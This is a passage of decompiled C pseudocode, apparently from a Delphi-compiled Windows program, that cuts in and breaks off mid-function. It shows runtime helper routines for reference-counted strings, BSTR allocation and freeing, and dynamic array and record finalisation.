      if (uVar3 != 0) {
        uVar4 = *param_1;
        uVar1 = *param_2;
        if ((char)uVar4 != (char)uVar1) {
          return puVar2;
        }
        if (uVar3 != 1) {
          if ((char)(uVar4 >> 8) != (char)(uVar1 >> 8)) {
            return puVar2;
          }
          if ((uVar3 != 2) && ((uVar4 & 0xff0000) != (uVar1 & 0xff0000))) {
            return puVar2;
          }
        }
      }
      param_1 = (uint *)((int)puVar2 * 2);
    }
  }
  return param_1;
}



void FUN_004044e8(int param_1)

{
  int iVar1;
  
  if ((param_1 != 0) &&
     (iVar1 = *(int *)(param_1 + -8), iVar1 != -1 && SCARRY4(iVar1,1) == iVar1 + 1 < 0)) {
    LOCK();
    *(int *)(param_1 + -8) = *(int *)(param_1 + -8) + 1;
    UNLOCK();
  }
  return;
}



undefined * FUN_004044f8(undefined *param_1)

{
  if (param_1 != (undefined *)0x0) {
    return param_1;
  }
  return &DAT_004044fd;
}



int FUN_00404504(int *param_1)

{
  int *piVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  
  iVar4 = *param_1;
  if ((iVar4 != 0) && (*(int *)(iVar4 + -8) != 1)) {
    puVar3 = FUN_00404120(*(int *)(iVar4 + -4));
    puVar2 = (undefined4 *)*param_1;
    *param_1 = (int)puVar3;
    FUN_00402890(puVar2,puVar3,puVar2[-1]);
    if (0 < (int)puVar2[-2]) {
      LOCK();
      piVar1 = puVar2 + -2;
      *piVar1 = *piVar1 + -1;
      UNLOCK();
      if (*piVar1 == 0) {
        FUN_004026b0((int)(puVar2 + -2));
      }
    }
    iVar4 = *param_1;
  }
  return iVar4;
}



int thunk_FUN_00404504(int *param_1)

{
  int *piVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  
  iVar4 = *param_1;
  if ((iVar4 != 0) && (*(int *)(iVar4 + -8) != 1)) {
    puVar3 = FUN_00404120(*(int *)(iVar4 + -4));
    puVar2 = (undefined4 *)*param_1;
    *param_1 = (int)puVar3;
    FUN_00402890(puVar2,puVar3,puVar2[-1]);
    if (0 < (int)puVar2[-2]) {
      LOCK();
      piVar1 = puVar2 + -2;
      *piVar1 = *piVar1 + -1;
      UNLOCK();
      if (*piVar1 == 0) {
        FUN_004026b0((int)(puVar2 + -2));
      }
    }
    iVar4 = *param_1;
  }
  return iVar4;
}



int thunk_FUN_00404504(int *param_1)

{
  int *piVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  
  iVar4 = *param_1;
  if ((iVar4 != 0) && (*(int *)(iVar4 + -8) != 1)) {
    puVar3 = FUN_00404120(*(int *)(iVar4 + -4));
    puVar2 = (undefined4 *)*param_1;
    *param_1 = (int)puVar3;
    FUN_00402890(puVar2,puVar3,puVar2[-1]);
    if (0 < (int)puVar2[-2]) {
      LOCK();
      piVar1 = puVar2 + -2;
      *piVar1 = *piVar1 + -1;
      UNLOCK();
      if (*piVar1 == 0) {
        FUN_004026b0((int)(puVar2 + -2));
      }
    }
    iVar4 = *param_1;
  }
  return iVar4;
}



void FUN_00404558(int param_1,int param_2,uint param_3,int *param_4)

{
  int iVar1;
  int iVar2;
  
  if ((param_1 != 0) && (iVar1 = *(int *)(param_1 + -4), iVar1 != 0)) {
    iVar2 = param_2 + -1;
    if (param_2 < 1) {
      iVar2 = 0;
    }
    else if (iVar1 <= iVar2) goto LAB_0040458a;
    if (-1 < (int)param_3) {
      if (iVar1 - iVar2 < (int)param_3) {
        param_3 = iVar1 - iVar2;
      }
      FUN_0040414c(param_4,(undefined4 *)(iVar2 + param_1),param_3);
      return;
    }
  }
LAB_0040458a:
  FUN_0040405c(param_4);
  return;
}



void FUN_00404598(int *param_1,int param_2,int param_3)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  thunk_FUN_00404504(param_1);
  iVar1 = *param_1;
  if (iVar1 != 0) {
    iVar3 = param_2 + -1;
    if (((0 < param_2) && (iVar3 < *(int *)(iVar1 + -4))) && (0 < param_3)) {
      iVar2 = *(int *)(iVar1 + -4) - iVar3;
      if (iVar2 < param_3) {
        param_3 = iVar2;
      }
      FUN_00402890((undefined4 *)(param_3 + (int)(undefined4 *)(iVar1 + iVar3)),
                   (undefined4 *)(iVar1 + iVar3),iVar2 - param_3);
      FUN_00404628(param_1,*(int *)(*param_1 + -4) - param_3);
    }
  }
  return;
}



char * FUN_004045e0(char *param_1,char *param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  char *pcVar4;
  char *pcVar5;
  char *pcVar6;
  bool bVar7;
  
  if (param_1 != (char *)0x0) {
    if (param_2 == (char *)0x0) {
      return (char *)0x0;
    }
    iVar3 = *(int *)(param_1 + -4) + -1;
    if (-1 < iVar3) {
      iVar1 = *(int *)(param_2 + -4) - iVar3;
      bVar7 = iVar1 == 0;
      pcVar5 = param_2;
      if (!bVar7 && iVar3 <= *(int *)(param_2 + -4)) {
LAB_00404600:
        do {
          if (iVar1 != 0) {
            iVar1 = iVar1 + -1;
            pcVar4 = pcVar5 + 1;
            bVar7 = *param_1 == *pcVar5;
            pcVar5 = pcVar4;
            if (!bVar7) goto LAB_00404600;
          }
          iVar2 = iVar3;
          pcVar4 = param_1 + 1;
          pcVar6 = pcVar5;
          if (!bVar7) break;
          do {
            if (iVar2 == 0) break;
            bVar7 = *pcVar4 == *pcVar6;
            iVar2 = iVar2 + -1;
            pcVar4 = pcVar4 + 1;
            pcVar6 = pcVar6 + 1;
          } while (bVar7);
          if (bVar7) {
            return pcVar5 + -(int)param_2;
          }
        } while( true );
      }
    }
    param_1 = (char *)0x0;
  }
  return param_1;
}



void FUN_00404628(int *param_1,uint param_2)

{
  undefined4 *puVar1;
  uint uVar2;
  undefined4 *puVar3;
  int iStack_10;
  
  puVar3 = (undefined4 *)0x0;
  if (0 < (int)param_2) {
    iStack_10 = *param_1;
    if ((iStack_10 != 0) && (*(int *)(iStack_10 + -8) == 1)) {
      iStack_10 = iStack_10 + -8;
      FUN_004026d0(&iStack_10,param_2 + 9);
      *param_1 = iStack_10 + 8;
      *(uint *)(iStack_10 + 4) = param_2;
      *(undefined *)(param_2 + iStack_10 + 8) = 0;
      return;
    }
    iStack_10 = 0x404665;
    puVar3 = FUN_00404120(param_2);
    puVar1 = (undefined4 *)*param_1;
    if (puVar1 != (undefined4 *)0x0) {
      uVar2 = puVar1[-1];
      if ((int)param_2 <= (int)puVar1[-1]) {
        uVar2 = param_2;
      }
      iStack_10 = 0x40467d;
      FUN_00402890(puVar1,puVar3,uVar2);
    }
  }
  iStack_10 = 0x404684;
  FUN_0040405c(param_1);
  *param_1 = (int)puVar3;
  return;
}



void FUN_0040468c(undefined *param_1,undefined *param_2)

{
  FUN_00404694(param_1,param_2,0);
  return;
}



void FUN_00404694(undefined *param_1,undefined *param_2,int param_3)

{
  undefined *puVar1;
  int iVar2;
  
  iVar2 = 0;
  if (param_2 != (undefined *)0x0) {
    iVar2 = *(int *)(param_2 + -4);
    param_3 = param_3 - iVar2;
  }
  puVar1 = FUN_0040304c(param_1,param_3);
  FUN_00402ff8(puVar1,param_2,iVar2);
  return;
}



void FUN_004046bc(UINT param_1)

{
  BSTR pOVar1;
  
  if (param_1 != 0) {
    pOVar1 = SysAllocStringLen((OLECHAR *)0x0,param_1);
    if (pOVar1 == (BSTR)0x0) {
      FUN_00402778(1);
      return;
    }
  }
  return;
}



void FUN_004046d4(BSTR *param_1,BSTR param_2)

{
  BSTR bstrString;
  
  LOCK();
  bstrString = *param_1;
  *param_1 = param_2;
  UNLOCK();
  if (bstrString != (BSTR)0x0) {
    SysFreeString(bstrString);
  }
  return;
}



BSTR * FUN_004046e4(BSTR *param_1)

{
  BSTR bstrString;
  
  bstrString = *param_1;
  if (bstrString != (BSTR)0x0) {
    *param_1 = (BSTR)0x0;
    SysFreeString(bstrString);
  }
  return param_1;
}



void FUN_004046fc(BSTR *param_1,int param_2)

{
  BSTR bstrString;
  
  do {
    bstrString = *param_1;
    if (bstrString != (BSTR)0x0) {
      *param_1 = (BSTR)0x0;
      SysFreeString(bstrString);
    }
    param_1 = param_1 + 1;
    param_2 = param_2 + -1;
  } while (param_2 != 0);
  return;
}



BSTR * FUN_00404720(BSTR *param_1,OLECHAR *param_2)

{
  BSTR bstrString;
  BSTR *ppOVar1;
  
  if ((param_2 != (OLECHAR *)0x0) && (*(uint *)(param_2 + -2) >> 1 != 0)) {
    ppOVar1 = (BSTR *)SysReAllocStringLen(param_1,param_2,*(uint *)(param_2 + -2) >> 1);
    if (ppOVar1 != (BSTR *)0x0) {
      return ppOVar1;
    }
    ppOVar1 = (BSTR *)FUN_00402778(1);
    return ppOVar1;
  }
  bstrString = *param_1;
  if (bstrString != (BSTR)0x0) {
    *param_1 = (BSTR)0x0;
    SysFreeString(bstrString);
  }
  return param_1;
}



void FUN_00404744(BSTR *param_1,LPCSTR param_2,int param_3)

{
  UINT UVar1;
  UINT UVar2;
  BSTR *local_1010 [1024];
  
  local_1010[0] = param_1;
  if (param_3 < 1) {
    FUN_004046e4(param_1);
  }
  else {
    UVar2 = param_3 + 1;
    if (((int)UVar2 < 0x7ff) &&
       (UVar1 = FUN_0040419c((LPWSTR)local_1010,0x7ff,param_2,param_3), 0 < (int)UVar1)) {
      FUN_004047d0(param_1,(OLECHAR *)local_1010,UVar1);
      return;
    }
    FUN_0040492c(param_1,UVar2);
    UVar2 = FUN_0040419c(*param_1,UVar2,param_2,param_3);
    if ((int)UVar2 < 0) {
      UVar2 = 0;
    }
    FUN_0040492c(param_1,UVar2);
  }
  return;
}



BSTR * FUN_004047d0(BSTR *param_1,OLECHAR *param_2,UINT param_3)

{
  BSTR pOVar1;
  BSTR *ppOVar2;
  
  if (param_3 == 0) {
    pOVar1 = *param_1;
    if (pOVar1 != (BSTR)0x0) {
      *param_1 = (BSTR)0x0;
      SysFreeString(pOVar1);
    }
    return param_1;
  }
  ppOVar2 = (BSTR *)SysAllocStringLen(param_2,param_3);
  if (ppOVar2 != (BSTR *)0x0) {
    pOVar1 = *param_1;
    *param_1 = (BSTR)ppOVar2;
    SysFreeString(pOVar1);
    return ppOVar2;
  }
  ppOVar2 = (BSTR *)FUN_00402778(1);
  return ppOVar2;
}



void FUN_004047f4(BSTR *param_1,OLECHAR *param_2)

{
  UINT UVar1;
  OLECHAR *pOVar2;
  
  UVar1 = 0;
  pOVar2 = param_2;
  if (param_2 != (OLECHAR *)0x0) {
    for (; *pOVar2 != L'\0'; pOVar2 = pOVar2 + 4) {
      if (pOVar2[1] == L'\0') {
LAB_0040481d:
        pOVar2 = pOVar2 + 1;
        break;
      }
      if (pOVar2[2] == L'\0') {
LAB_0040481a:
        pOVar2 = pOVar2 + 1;
        goto LAB_0040481d;
      }
      if (pOVar2[3] == L'\0') {
        pOVar2 = pOVar2 + 1;
        goto LAB_0040481a;
      }
    }
    UVar1 = (uint)((int)pOVar2 - (int)param_2) >> 1;
  }
  FUN_004047d0(param_1,param_2,UVar1);
  return;
}



void FUN_00404830(BSTR *param_1,LPCSTR param_2)

{
  int iVar1;
  
  iVar1 = 0;
  if (param_2 != (LPCSTR)0x0) {
    iVar1 = *(int *)(param_2 + -4);
  }
  FUN_00404744(param_1,param_2,iVar1);
  return;
}



undefined * FUN_00404840(undefined *param_1)

{
  if (param_1 != (undefined *)0x0) {
    return param_1;
  }
  return &DAT_00404846;
}



uint FUN_00404850(uint param_1)

{
  if (param_1 != 0) {
    param_1 = *(uint *)(param_1 - 4) >> 1;
  }
  return param_1;
}



int * FUN_0040485c(int *param_1,int *param_2)

{
  int *piVar1;
  uint uVar2;
  uint uVar3;
  
  piVar1 = param_1;
  if (param_1 != param_2) {
    if (param_1 == (int *)0x0) {
      piVar1 = (int *)-param_2[-1];
    }
    else if (param_2 == (int *)0x0) {
      piVar1 = (int *)param_1[-1];
    }
    else {
      uVar2 = param_2[-1];
      piVar1 = (int *)(param_1[-1] - uVar2);
      if ((uint)param_1[-1] < uVar2 || piVar1 == (int *)0x0) {
        uVar2 = uVar2 + (int)piVar1;
      }
      for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 2) {
        if (*param_1 != *param_2) {
          return piVar1;
        }
        if (uVar3 == 1) {
          param_1 = param_1 + 1;
          param_2 = param_2 + 1;
          break;
        }
        if (param_1[1] != param_2[1]) {
          return piVar1;
        }
        param_1 = param_1 + 2;
        param_2 = param_2 + 2;
      }
      if (((uVar2 & 2) == 0) || (*(short *)param_1 == *(short *)param_2)) {
        piVar1 = (int *)((int)piVar1 * 2);
      }
    }
  }
  return piVar1;
}



void FUN_004048e0(uint param_1,int param_2,UINT param_3,BSTR *param_4)

{
  uint uVar1;
  UINT UVar2;
  uint uVar3;
  
  uVar1 = FUN_00404850(param_1);
  if (param_2 < 1) {
    uVar3 = 0;
  }
  else {
    uVar3 = param_2 - 1U;
    if ((int)uVar1 < (int)(param_2 - 1U)) {
      uVar3 = uVar1;
    }
  }
  if ((int)param_3 < 0) {
    UVar2 = 0;
  }
  else {
    UVar2 = uVar1 - uVar3;
    if ((int)param_3 < (int)(uVar1 - uVar3)) {
      UVar2 = param_3;
    }
  }
  FUN_004047d0(param_4,(OLECHAR *)(uVar3 * 2 + param_1),UVar2);
  return;
}



void FUN_0040492c(BSTR *param_1,UINT param_2)

{
  uint uVar1;
  undefined4 *puVar2;
  
  puVar2 = (undefined4 *)0x0;
  if (0 < (int)param_2) {
    puVar2 = (undefined4 *)FUN_004046bc(param_2);
    uVar1 = FUN_00404850((uint)*param_1);
    if (0 < (int)uVar1) {
      if ((int)param_2 < (int)uVar1) {
        uVar1 = param_2;
      }
      FUN_00402890((undefined4 *)*param_1,puVar2,uVar1 * 2);
    }
  }
  FUN_004046d4(param_1,(BSTR)puVar2);
  return;
}



void FUN_00404970(int param_1,int param_2)

{
  bool bVar1;
  undefined4 *puVar2;
  int iVar3;
  int iVar4;
  
  puVar2 = (undefined4 *)(*(byte *)(param_2 + 1) + 10 + param_2);
  iVar3 = *(int *)(*(byte *)(param_2 + 1) + 6 + param_2);
  do {
    FUN_004049a0((undefined4 *)(puVar2[1] + param_1),*(char **)*puVar2,1);
    puVar2 = puVar2 + 2;
    iVar4 = iVar3 + -1;
    bVar1 = 0 < iVar3;
    iVar3 = iVar4;
  } while (iVar4 != 0 && bVar1);
  return;
}



void FUN_004049a0(undefined4 *param_1,char *param_2,int param_3)

{
  char cVar1;
  bool bVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  
  if (param_3 == 0) {
    return;
  }
  cVar1 = *param_2;
  uVar3 = (uint)(byte)param_2[1];
  if ((cVar1 != '\n') && (cVar1 != '\v')) {
    if (cVar1 == '\f') {
      do {
        *param_1 = 0;
        param_1[1] = 0;
        param_1[2] = 0;
        param_1[3] = 0;
        param_1 = param_1 + 4;
        iVar4 = param_3 + -1;
        bVar2 = 0 < param_3;
        param_3 = iVar4;
      } while (iVar4 != 0 && bVar2);
      return;
    }
    if (cVar1 == '\r') {
      do {
        iVar4 = *(int *)(param_2 + uVar3 + 2);
        FUN_004049a0(param_1,**(char ***)(param_2 + uVar3 + 10),*(int *)(param_2 + uVar3 + 6));
        iVar5 = param_3 + -1;
        bVar2 = 0 < param_3;
        param_1 = (undefined4 *)((int)param_1 + iVar4);
        param_3 = iVar5;
      } while (iVar5 != 0 && bVar2);
      return;
    }
    if (cVar1 == '\x0e') {
      do {
        iVar4 = *(int *)(param_2 + uVar3 + 2);
        FUN_00404970((int)param_1,(int)param_2);
        iVar5 = param_3 + -1;
        bVar2 = 0 < param_3;
        param_1 = (undefined4 *)((int)param_1 + iVar4);
        param_3 = iVar5;
      } while (iVar5 != 0 && bVar2);
      return;
    }
    if ((cVar1 != '\x0f') && (cVar1 != '\x11')) {
      FUN_00402778(CONCAT31((int3)((uint)param_1 >> 8),2));
      return;
    }
  }
  do {
    *param_1 = 0;
    param_1 = param_1 + 1;
    iVar4 = param_3 + -1;
    bVar2 = 0 < param_3;
    param_3 = iVar4;
  } while (iVar4 != 0 && bVar2);
  return;
}



int FUN_00404a34(int param_1,int param_2)

{
  bool bVar1;
  undefined4 *puVar2;
  int iVar3;
  int iVar4;
  
  puVar2 = (undefined4 *)(*(byte *)(param_2 + 1) + 10 + param_2);
  iVar3 = *(int *)(*(byte *)(param_2 + 1) + 6 + param_2);
  do {
    FUN_00404a80((int **)(puVar2[1] + param_1),*(char **)*puVar2,1);
    puVar2 = puVar2 + 2;
    iVar4 = iVar3 + -1;
    bVar1 = 0 < iVar3;
    iVar3 = iVar4;
  } while (iVar4 != 0 && bVar1);
  return param_1;
}



void FUN_00404a68(undefined4 param_1)

{
  if (DAT_00418010 != (code *)0x0) {
    (*DAT_00418010)();
    return;
  }
  FUN_00402778(CONCAT31((int3)((uint)param_1 >> 8),0x10));
  return;
}



int ** FUN_00404a80(int **param_1,char *param_2,int param_3)

{
  char cVar1;
  bool bVar2;
  int **ppiVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  
  if (param_3 != 0) {
    cVar1 = *param_2;
    uVar4 = (uint)(byte)param_2[1];
    if (cVar1 == '\n') {
      if (param_3 < 2) {
        FUN_0040405c((int *)param_1);
      }
      else {
        FUN_00404080((int *)param_1,param_3);
      }
    }
    else if (cVar1 == '\v') {
      if (param_3 < 2) {
        FUN_004046e4((BSTR *)param_1);
      }
      else {
        FUN_004046fc((BSTR *)param_1,param_3);
      }
    }
    else {
      ppiVar3 = param_1;
      if (cVar1 == '\f') {
        do {
          FUN_00404a68(ppiVar3);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 4;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
      else if (cVar1 == '\r') {
        do {
          iVar6 = *(int *)(param_2 + uVar4 + 2);
          FUN_00404a80(ppiVar3,**(char ***)(param_2 + uVar4 + 10),*(int *)(param_2 + uVar4 + 6));
          iVar5 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = (int **)((int)ppiVar3 + iVar6);
          param_3 = iVar5;
        } while (iVar5 != 0 && bVar2);
      }
      else if (cVar1 == '\x0e') {
        do {
          iVar6 = *(int *)(param_2 + uVar4 + 2);
          FUN_00404a34((int)ppiVar3,(int)param_2);
          iVar5 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = (int **)((int)ppiVar3 + iVar6);
          param_3 = iVar5;
        } while (iVar5 != 0 && bVar2);
      }
      else if (cVar1 == '\x0f') {
        do {
          FUN_00405638(ppiVar3);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 1;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
      else {
        if (cVar1 != '\x11') {
          ppiVar3 = (int **)FUN_00402778(CONCAT31((int3)((uint)param_1 >> 8),2));
          return ppiVar3;
        }
        do {
          FUN_00404f94((int *)ppiVar3,(int)param_2);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 1;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
    }
  }
  return param_1;
}



void FUN_00404b6c(int **param_1,char *param_2)

{
  FUN_00404a80(param_1,param_2,1);
  return;
}



void FUN_00404b78(undefined4 param_1)

{
  if (DAT_00418018 != (code *)0x0) {
    (*DAT_00418018)();
    return;
  }
  FUN_00402778(CONCAT31((int3)((uint)param_1 >> 8),0x10));
  return;
}



void FUN_00404b90(int param_1,int param_2,int param_3)

{
  char cVar1;
  int iVar2;
  int iVar3;
  char *pcVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  undefined4 *puVar8;
  
  puVar8 = (undefined4 *)(*(byte *)(param_3 + 1) + 10 + param_3);
  iVar7 = puVar8[-1];
  iVar5 = 0;
  iVar2 = puVar8[-2];
  do {
    uVar6 = puVar8[1] - iVar5;
    if (uVar6 != 0 && iVar5 <= (int)puVar8[1]) {
      FUN_00402890((undefined4 *)(iVar5 + param_2),(undefined4 *)(iVar5 + param_1),uVar6);
    }
    iVar3 = puVar8[1];
    pcVar4 = *(char **)*puVar8;
    cVar1 = *pcVar4;
    if (cVar1 == '\n') {
      FUN_004040b0((int *)(iVar3 + param_1),*(undefined4 **)(iVar3 + param_2));
      iVar5 = 4;
    }
    else if (cVar1 == '\v') {
      FUN_00404720((BSTR *)(iVar3 + param_1),*(OLECHAR **)(iVar3 + param_2));
      iVar5 = 4;
    }
    else if (cVar1 == '\f') {
      FUN_00404b78(iVar3 + param_1);
      iVar5 = 0x10;
    }
    else if (cVar1 == '\r') {
      uVar6 = (uint)(byte)pcVar4[1];
      iVar5 = *(int *)(pcVar4 + uVar6 + 2);
      FUN_00404cac((int **)(iVar3 + param_1),(OLECHAR **)(iVar3 + param_2),
                   **(char ***)(pcVar4 + uVar6 + 10),*(int *)(pcVar4 + uVar6 + 6));
    }
    else if (cVar1 == '\x0e') {
      iVar5 = *(int *)(pcVar4 + (byte)pcVar4[1] + 2);
      FUN_00404b90(iVar3 + param_1,iVar3 + param_2,(int)pcVar4);
    }
    else if (cVar1 == '\x0f') {
      FUN_00405650((int **)(iVar3 + param_1),*(int ***)(iVar3 + param_2));
      iVar5 = 4;
    }
    else {
      if (cVar1 != '\x11') {
        FUN_00402778(CONCAT31((int3)((uint)iVar3 >> 8),2));
        return;
      }
      FUN_00404fd0((int *)(iVar3 + param_1),*(int *)(iVar3 + param_2),(int)pcVar4);
      iVar5 = 4;
    }
    iVar5 = iVar5 + puVar8[1];
    puVar8 = puVar8 + 2;
    iVar7 = iVar7 + -1;
  } while (iVar7 != 0);
  uVar6 = iVar2 - iVar5;
  if (uVar6 != 0 && iVar5 <= iVar2) {
    FUN_00402890((undefined4 *)(iVar5 + param_2),(undefined4 *)(iVar5 + param_1),uVar6);
  }
  return;
}



void FUN_00404cac(int **param_1,OLECHAR **param_2,char *param_3,int param_4)

{
  int *piVar1;
  char cVar2;
  
  cVar2 = *param_3;
  if (cVar2 == '\n') {
    do {
      FUN_004040b0((int *)param_1,(undefined4 *)*param_2);
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else if (cVar2 == '\v') {
    do {
      FUN_00404720((BSTR *)param_1,*param_2);
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else if (cVar2 == '\f') {
    do {
      FUN_00404b78(param_1);
      param_1 = param_1 + 4;
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else if (cVar2 == '\r') {
    piVar1 = (int *)(param_3 + (byte)param_3[1] + 2);
    do {
      FUN_00404cac(param_1,param_2,(char *)piVar1[2],piVar1[1]);
      param_1 = (int **)((int)param_1 + *piVar1);
      param_2 = (OLECHAR **)((int)param_2 + *piVar1);
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else if (cVar2 == '\x0e') {
    do {
      FUN_00404b90((int)param_1,(int)param_2,(int)param_3);
      param_1 = (int **)((int)param_1 + *(int *)(param_3 + (byte)param_3[1] + 2));
      param_2 = (OLECHAR **)((int)param_2 + *(int *)(param_3 + (byte)param_3[1] + 2));
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else if (cVar2 == '\x0f') {
    do {
      FUN_00405650(param_1,(int **)*param_2);
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  else {
    if (cVar2 != '\x11') {
      FUN_00402778(CONCAT31((int3)((uint)param_1 >> 8),2));
      return;
    }
    do {
      FUN_00404fd0((int *)param_1,(int)*param_2,(int)param_3);
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
      param_4 = param_4 + -1;
    } while (param_4 != 0);
  }
  return;
}



int FUN_00404da8(int param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  return param_1 * param_4;
}



int FUN_00404dcc(int param_1)

{
  if (param_1 != 0) {
    param_1 = *(int *)(param_1 + -4);
  }
  return param_1;
}



int FUN_00404dd4(int param_1)

{
  int iVar1;
  
  iVar1 = FUN_00404dcc(param_1);
  return iVar1 + -1;
}



void FUN_00404ddc(int **param_1,OLECHAR **param_2,char *param_3,int param_4)

{
  FUN_00404cac(param_1,param_2,param_3,param_4);
  return;
}



int ** thunk_FUN_00404a80(int **param_1,char *param_2,int param_3)

{
  char cVar1;
  bool bVar2;
  int **ppiVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  
  if (param_3 != 0) {
    cVar1 = *param_2;
    uVar4 = (uint)(byte)param_2[1];
    if (cVar1 == '\n') {
      if (param_3 < 2) {
        FUN_0040405c((int *)param_1);
      }
      else {
        FUN_00404080((int *)param_1,param_3);
      }
    }
    else if (cVar1 == '\v') {
      if (param_3 < 2) {
        FUN_004046e4((BSTR *)param_1);
      }
      else {
        FUN_004046fc((BSTR *)param_1,param_3);
      }
    }
    else {
      ppiVar3 = param_1;
      if (cVar1 == '\f') {
        do {
          FUN_00404a68(ppiVar3);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 4;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
      else if (cVar1 == '\r') {
        do {
          iVar6 = *(int *)(param_2 + uVar4 + 2);
          FUN_00404a80(ppiVar3,**(char ***)(param_2 + uVar4 + 10),*(int *)(param_2 + uVar4 + 6));
          iVar5 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = (int **)((int)ppiVar3 + iVar6);
          param_3 = iVar5;
        } while (iVar5 != 0 && bVar2);
      }
      else if (cVar1 == '\x0e') {
        do {
          iVar6 = *(int *)(param_2 + uVar4 + 2);
          FUN_00404a34((int)ppiVar3,(int)param_2);
          iVar5 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = (int **)((int)ppiVar3 + iVar6);
          param_3 = iVar5;
        } while (iVar5 != 0 && bVar2);
      }
      else if (cVar1 == '\x0f') {
        do {
          FUN_00405638(ppiVar3);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 1;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
      else {
        if (cVar1 != '\x11') {
          ppiVar3 = (int **)FUN_00402778(CONCAT31((int3)((uint)param_1 >> 8),2));
          return ppiVar3;
        }
        do {
          FUN_00404f94((int *)ppiVar3,(int)param_2);
          iVar6 = param_3 + -1;
          bVar2 = 0 < param_3;
          ppiVar3 = ppiVar3 + 1;
          param_3 = iVar6;
        } while (iVar6 != 0 && bVar2);
      }
    }
  }
  return param_1;
}



void FUN_00404df4(int *param_1,int param_2)

{
  FUN_00404f94(param_1,param_2);
  return;
}



void FUN_00404dfc(int **param_1,int param_2,int param_3,int *param_4)

{
  char **ppcVar1;
  int *piVar2;
  int iVar3;
  char *pcVar4;
  int iVar5;
  int *local_24;
  int local_20;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  int local_c;
  int **local_8;
  
  piVar2 = *param_1;
  iVar5 = *param_4;
  local_c = param_3;
  local_8 = param_1;
  if (iVar5 < 1) {
    if (iVar5 < 0) {
      FUN_00402778(CONCAT31((int3)((uint)param_4 >> 8),4));
    }
    FUN_00404df4((int *)local_8,param_2);
  }
  else {
    local_14 = 0;
    if (piVar2 != (int *)0x0) {
      local_14 = piVar2[-1];
      piVar2 = piVar2 + -2;
    }
    iVar3 = param_2 + (uint)*(byte *)(param_2 + 1);
    local_1c = *(int *)(iVar3 + 2);
    ppcVar1 = *(char ***)(iVar3 + 6);
    if (ppcVar1 == (char **)0x0) {
      pcVar4 = (char *)0x0;
    }
    else {
      pcVar4 = *ppcVar1;
    }
    local_20 = iVar5 * local_1c;
    if (local_20 / iVar5 != local_1c) {
      FUN_00402778(CONCAT31((int3)((uint)(local_20 / iVar5) >> 8),4));
    }
    local_20 = local_20 + 8;
    if ((piVar2 == (int *)0x0) || (*piVar2 == 1)) {
      local_24 = piVar2;
      if ((iVar5 < local_14) && (pcVar4 != (char *)0x0)) {
        thunk_FUN_00404a80((int **)((int)piVar2 + iVar5 * local_1c + 8),pcVar4,local_14 - iVar5);
      }
      FUN_004026d0((int *)&local_24,local_20);
      piVar2 = local_24;
    }
    else {
      *piVar2 = *piVar2 + -1;
      piVar2 = (int *)FUN_00402690(local_20);
      local_18 = local_14;
      if (iVar5 < local_14) {
        local_18 = iVar5;
      }
      if (pcVar4 == (char *)0x0) {
        FUN_00402890(*local_8,piVar2 + 2,local_18 * local_1c);
      }
      else {
        FUN_00402e48(piVar2 + 2,local_18 * local_1c,0);
        FUN_00404ddc((int **)(piVar2 + 2),(OLECHAR **)*local_8,pcVar4,local_18);
      }
    }
    *piVar2 = 1;
    piVar2[1] = iVar5;
    piVar2 = piVar2 + 2;
    FUN_00402e48((int *)(local_1c * local_14 + (int)piVar2),(iVar5 - local_14) * local_1c,0);
    if (1 < local_c) {
      local_c = local_c + -1;
      if (-1 < iVar5 + -1) {
        local_10 = 0;
        do {
          FUN_00404dfc((int **)(piVar2 + local_10),(int)pcVar4,local_c,param_4 + 1);
          local_10 = local_10 + 1;
          iVar5 = iVar5 + -1;
        } while (iVar5 != 0);
      }
    }
    *local_8 = piVar2;
  }
  return;
}



void FUN_00404f88(int **param_1,int param_2,int param_3)

{
  FUN_00404dfc(param_1,param_2,param_3,(int *)&stack0x00000004);
  return;
}



int * FUN_00404f94(int *param_1,int param_2)

{
  int **ppiVar1;
  char **ppcVar2;
  int **ppiVar3;
  
  ppiVar3 = (int **)*param_1;
  if (ppiVar3 != (int **)0x0) {
    *param_1 = 0;
    LOCK();
    ppiVar1 = ppiVar3 + -2;
    *ppiVar1 = (int *)((int)*ppiVar1 + -1);
    UNLOCK();
